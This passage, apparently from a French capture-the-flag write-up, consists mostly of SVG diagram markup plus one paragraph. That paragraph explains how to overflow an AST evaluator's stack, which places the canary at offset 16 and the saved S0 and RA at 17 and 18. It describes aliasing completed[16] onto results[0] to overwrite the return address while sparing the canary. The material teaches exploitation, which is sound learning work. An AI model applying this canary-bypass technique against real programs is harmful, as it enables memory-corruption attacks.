<text text-anchor='middle' x='600' y='580' fill='currentColor' style='font-size:1em'>√©</text>
<text text-anchor='middle' x='608' y='84' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='608' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='608' y='404' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='608' y='484' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='608' y='580' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='616' y='580' fill='currentColor' style='font-size:1em'>√©</text>
<text text-anchor='middle' x='624' y='84' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='624' y='164' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='624' y='404' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='624' y='484' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='624' y='580' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='632' y='84' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='632' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='632' y='404' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='632' y='484' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='632' y='580' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='640' y='84' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='640' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='640' y='404' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='640' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='640' y='580' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='648' y='84' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='648' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='648' y='404' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='648' y='484' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='648' y='580' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='656' y='84' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='656' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='656' y='404' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='656' y='484' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='656' y='580' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='664' y='84' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='664' y='164' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='664' y='404' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='664' y='484' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='672' y='84' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='672' y='164' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='672' y='404' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='672' y='484' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='672' y='580' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='680' y='84' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='680' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='680' y='404' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='680' y='484' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='680' y='580' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='688' y='84' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='688' y='164' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='688' y='404' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='688' y='484' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='696' y='84' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='696' y='404' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='696' y='580' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='704' y='84' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='704' y='404' fill='currentColor' style='font-size:1em'>"</text>
<text text-anchor='middle' x='704' y='580' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='712' y='580' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='720' y='580' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='728' y='580' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='736' y='580' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='744' y='580' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='752' y='580' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='760' y='580' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='776' y='580' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='784' y='580' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='792' y='580' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='800' y='580' fill='currentColor' style='font-size:1em'>l</text>
</g>

    </svg>
  
</div>
<p>Nice! On a trouv√© comment overflow, maintenant il faudrait arriver √† modifier notre exploit pour overwrite simplement l&rsquo;adresse de retour et pas le canary. On note que le canary est plac√© √† l&rsquo;offset 16, que la sauvegarde de <code>S0</code> (le base pointer) est gard√©e √† l&rsquo;offset 17 et que la sauvegarde de <code>RA</code> est gard√©e √† l&rsquo;offset 18.</p>
<p>Pour overwrite RA, Une des mani√®res de faire c&rsquo;est d&rsquo;exploiter le fait que le tableau completed est situ√© juste avant le tableau results ce qui fait que lorsque le DFS ira d√©r√©f√©rencer: <code>completed[16]</code> pour v√©rifier si la node d&rsquo;indice 16 a d√©j√† √©t√© √©valu√©e (l&rsquo;adresse m√©moire de cette node correspondrait donc √† l&rsquo;adresse m√©moire du canary), il acc√®dera en r√©alit√© √† <code>results[0]</code> donc si on fait en sorte que notre AST ressemble √† ceci:</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 704 553"
      >
      <g transform='translate(8,16)'>
<path d='M 152,0 L 160,0' fill='none' stroke='currentColor'></path>
<path d='M 152,32 L 160,32' fill='none' stroke='currentColor'></path>
<path d='M 216,112 L 224,112' fill='none' stroke='currentColor'></path>
<path d='M 264,128 L 280,128' fill='none' stroke='currentColor'></path>
<path d='M 216,144 L 224,144' fill='none' stroke='currentColor'></path>
<path d='M 152,224 L 160,224' fill='none' stroke='currentColor'></path>
<path d='M 152,256 L 160,256' fill='none' stroke='currentColor'></path>
<path d='M 192,256 L 208,256' fill='none' stroke='currentColor'></path>
<path d='M 96,320 L 104,320' fill='none' stroke='currentColor'></path>
<path d='M 152,336 L 208,336' fill='none' stroke='currentColor'></path>
<path d='M 96,352 L 104,352' fill='none' stroke='currentColor'></path>
<path d='M 224,432 L 264,432' fill='none' stroke='currentColor'></path>
<path d='M 96,528 L 208,528' fill='none' stroke='currentColor'></path>
<path d='M 224,352 L 224,432' fill='none' stroke='currentColor'></path>
<path d='M 224,432 L 224,512' fill='none' stroke='currentColor'></path>
<path d='M 64,192 L 88,144' fill='none' stroke='currentColor'></path>
<path d='M 104,112 L 144,32' fill='none' stroke='currentColor'></path>
<path d='M 8,512 L 24,480' fill='none' stroke='currentColor'></path>
<path d='M 40,448 L 48,432' fill='none' stroke='currentColor'></path>
<path d='M 80,368 L 88,352' fill='none' stroke='currentColor'></path>
<path d='M 112,320 L 144,256' fill='none' stroke='currentColor'></path>
<path d='M 168,224 L 208,144' fill='none' stroke='currentColor'></path>
<path d='M 40,480 L 56,512' fill='none' stroke='currentColor'></path>
<path d='M 112,352 L 136,400' fill='none' stroke='currentColor'></path>
<path d='M 104,144 L 128,192' fill='none' stroke='currentColor'></path>
<path d='M 168,256 L 192,304' fill='none' stroke='currentColor'></path>
<path d='M 168,32 L 208,112' fill='none' stroke='currentColor'></path>
<path d='M 232,144 L 264,208' fill='none' stroke='currentColor'></path>
<polygon points='200.000000,256.000000 188.000000,250.399994 188.000000,261.600006' fill='currentColor' transform='rotate(180.000000, 192.000000, 256.000000)'></polygon>
<polygon points='272.000000,128.000000 260.000000,122.400002 260.000000,133.600006' fill='currentColor' transform='rotate(180.000000, 264.000000, 128.000000)'></polygon>
<polygon points='272.000000,432.000000 260.000000,426.399994 260.000000,437.600006' fill='currentColor' transform='rotate(0.000000, 264.000000, 432.000000)'></polygon>
<path d='M 152,0 A 16,16 0 0,0 136,16' fill='none' stroke='currentColor'></path>
<path d='M 160,0 A 16,16 0 0,1 176,16' fill='none' stroke='currentColor'></path>
<path d='M 136,16 A 16,16 0 0,0 152,32' fill='none' stroke='currentColor'></path>
<path d='M 176,16 A 16,16 0 0,1 160,32' fill='none' stroke='currentColor'></path>
<path d='M 96,112 A 16,16 0 0,0 80,128' fill='none' stroke='currentColor'></path>
<path d='M 96,112 A 16,16 0 0,1 112,128' fill='none' stroke='currentColor'></path>
<path d='M 216,112 A 16,16 0 0,0 200,128' fill='none' stroke='currentColor'></path>
<path d='M 224,112 A 16,16 0 0,1 240,128' fill='none' stroke='currentColor'></path>
<path d='M 80,128 A 16,16 0 0,0 96,144' fill='none' stroke='currentColor'></path>
<path d='M 112,128 A 16,16 0 0,1 96,144' fill='none' stroke='currentColor'></path>
<path d='M 200,128 A 16,16 0 0,0 216,144' fill='none' stroke='currentColor'></path>
<path d='M 240,128 A 16,16 0 0,1 224,144' fill='none' stroke='currentColor'></path>
<path d='M 152,224 A 16,16 0 0,0 136,240' fill='none' stroke='currentColor'></path>
<path d='M 160,224 A 16,16 0 0,1 176,240' fill='none' stroke='currentColor'></path>
<path d='M 136,240 A 16,16 0 0,0 152,256' fill='none' stroke='currentColor'></path>
<path d='M 176,240 A 16,16 0 0,1 160,256' fill='none' stroke='currentColor'></path>
<path d='M 96,320 A 16,16 0 0,0 80,336' fill='none' stroke='currentColor'></path>
<path d='M 104,320 A 16,16 0 0,1 120,336' fill='none' stroke='currentColor'></path>
<path d='M 208,336 A 16,16 0 0,1 224,352' fill='none' stroke='currentColor'></path>
<path d='M 80,336 A 16,16 0 0,0 96,352' fill='none' stroke='currentColor'></path>
<path d='M 120,336 A 16,16 0 0,1 104,352' fill='none' stroke='currentColor'></path>
<path d='M 32,448 A 16,16 0 0,0 16,464' fill='none' stroke='currentColor'></path>
<path d='M 32,448 A 16,16 0 0,1 48,464' fill='none' stroke='currentColor'></path>
<path d='M 16,464 A 16,16 0 0,0 32,480' fill='none' stroke='currentColor'></path>
<path d='M 48,464 A 16,16 0 0,1 32,480' fill='none' stroke='currentColor'></path>
<path d='M 224,512 A 16,16 0 0,1 208,528' fill='none' stroke='currentColor'></path>
<text text-anchor='middle' x='0' y='532' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='32' y='468' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='56' y='212' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='56' y='420' fill='currentColor' style='font-size:1em'>¬∑</text>
<text text-anchor='middle' x='64' y='404' fill='currentColor' style='font-size:1em'>¬∑</text>
<text text-anchor='middle' x='64' y='532' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='72' y='388' fill='currentColor' style='font-size:1em'>¬∑</text>
<text text-anchor='middle' x='96' y='132' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='96' y='340' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='104' y='340' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='136' y='212' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='144' y='420' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='152' y='244' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>9</text>
<text text-anchor='middle' x='160' y='244' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='200' y='324' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='224' y='260' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='224' y='276' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='224' y='292' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='232' y='260' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='232' y='276' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='232' y='292' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='240' y='260' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='240' y='292' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='248' y='260' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='248' y='276' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='248' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='256' y='276' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='256' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='264' y='260' fill='currentColor' style='font-size:1em'>q</text>
<text text-anchor='middle' x='264' y='276' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='264' y='292' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='272' y='228' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='272' y='260' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='272' y='276' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='280' y='228' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='280' y='260' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='280' y='276' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='280' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='280' y='436' fill='currentColor' style='font-size:1em'>C</text>
<text text-anchor='middle' x='280' y='452' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='280' y='468' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='280' y='484' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='280' y='500' fill='currentColor' style='font-size:1em'>q</text>
<text text-anchor='middle' x='288' y='228' fill='currentColor' style='font-size:1em'>W</text>
<text text-anchor='middle' x='288' y='436' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='288' y='452' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='288' y='468' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='288' y='484' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='288' y='500' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='296' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='296' y='148' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='296' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='296' y='180' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='296' y='228' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='296' y='260' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='296' y='276' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='296' y='292' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='296' y='436' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='296' y='452' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='296' y='500' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='304' y='132' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='304' y='148' fill='currentColor' style='font-size:1em'>'</text>
<text text-anchor='middle' x='304' y='180' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='304' y='228' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='304' y='260' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='304' y='276' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='304' y='468' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='304' y='484' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='312' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='312' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='312' y='164' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='312' y='228' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='312' y='276' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='312' y='292' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='312' y='436' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='312' y='452' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='312' y='468' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='312' y='484' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='312' y='500' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='320' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='320' y='148' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='320' y='180' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='320' y='260' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='320' y='276' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='320' y='292' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='320' y='436' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='320' y='452' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='320' y='468' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='320' y='484' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='320' y='500' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='328' y='148' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='328' y='164' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='328' y='180' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='328' y='260' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='328' y='276' fill='currentColor' style='font-size:1em'>√®</text>
<text text-anchor='middle' x='328' y='292' fill='currentColor' style='font-size:1em'>W</text>
<text text-anchor='middle' x='328' y='436' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='328' y='452' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='328' y='468' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='328' y='484' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='328' y='500' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='336' y='132' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='336' y='164' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='336' y='260' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='336' y='276' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='336' y='292' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='336' y='436' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='336' y='452' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='336' y='468' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='336' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='336' y='500' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='344' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='344' y='148' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='344' y='164' fill='currentColor' style='font-size:1em'>W</text>
<text text-anchor='middle' x='344' y='180' fill='currentColor' style='font-size:1em'>q</text>
<text text-anchor='middle' x='344' y='260' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='344' y='276' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='344' y='292' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='344' y='436' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='344' y='452' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='344' y='468' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='344' y='484' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='352' y='132' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='352' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='352' y='164' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='352' y='180' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='352' y='260' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='352' y='292' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='352' y='452' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='352' y='484' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='352' y='500' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='360' y='132' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='360' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='360' y='164' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='360' y='180' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='360' y='260' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='360' y='276' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='360' y='436' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='360' y='452' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='360' y='468' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='360' y='484' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='360' y='500' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='368' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='368' y='164' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='368' y='276' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='368' y='292' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='368' y='436' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='368' y='452' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='368' y='468' fill='currentColor' style='font-size:1em'>'</text>
<text text-anchor='middle' x='368' y='484' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='368' y='500' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='376' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='376' y='164' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='376' y='180' fill='currentColor' style='font-size:1em'>√©</text>
<text text-anchor='middle' x='376' y='260' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='376' y='452' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='376' y='468' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='376' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='384' y='132' fill='currentColor' style='font-size:1em'>q</text>
<text text-anchor='middle' x='384' y='148' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='384' y='180' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='384' y='260' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='384' y='276' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='384' y='292' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='384' y='436' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='384' y='452' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='384' y='468' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='384' y='500' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='392' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='392' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='392' y='164' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='392' y='180' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='392' y='260' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='392' y='276' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='392' y='292' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='392' y='436' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='392' y='452' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='392' y='468' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='392' y='484' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='392' y='500' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='400' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='400' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='400' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='400' y='180' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='400' y='260' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='400' y='276' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='400' y='292' fill='currentColor' style='font-size:1em'>W</text>
<text text-anchor='middle' x='400' y='436' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='400' y='452' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='400' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='408' y='180' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='408' y='260' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='408' y='276' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='408' y='292' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='408' y='436' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='408' y='452' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='408' y='468' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='408' y='500' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='416' y='132' fill='currentColor' style='font-size:1em'>&amp;</text>
<text text-anchor='middle' x='416' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='416' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='416' y='260' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='416' y='292' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='416' y='436' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='416' y='468' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='416' y='484' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='416' y='500' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='424' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='424' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='424' y='180' fill='currentColor' style='font-size:1em'>√†</text>
<text text-anchor='middle' x='424' y='260' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='424' y='276' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='424' y='292' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='424' y='436' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='424' y='452' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='424' y='468' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='424' y='484' fill='currentColor' style='font-size:1em'>0</text>
